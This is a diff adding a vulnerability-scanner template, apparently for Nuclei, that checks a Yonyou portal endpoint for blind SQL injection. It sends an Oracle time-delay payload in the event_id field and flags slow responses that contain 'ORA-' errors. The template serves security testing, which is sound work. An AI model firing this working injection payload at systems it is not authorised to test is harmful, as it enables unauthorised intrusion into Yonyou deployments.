@@ -1,0 +1,28 @@
+id: yonyou-blind-sql-injection
+
+info:
+  name: Yonyou Blind SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    This template checks for blind SQL injection in the Yonyou portal `changeEvent` endpoint using the `dbms_pipe.receive_message` function to induce a time delay.
+  tags: sql-injection, blind, yonyou
+
+http:
+  - raw:
+      - |
+        POST /portal/pt/oacoSchedulerEvents/changeEvent?pageId=login HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        event_id=1' AND 1=dbms_pipe.receive_message('RDS',5)--+#&startDate=2025-06-16 00:00:00&startDate_old=2025-06-16 24:00:00
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - duration > 5000
+      - type: word
+        part: body
+        words:
+          - "ORA-"
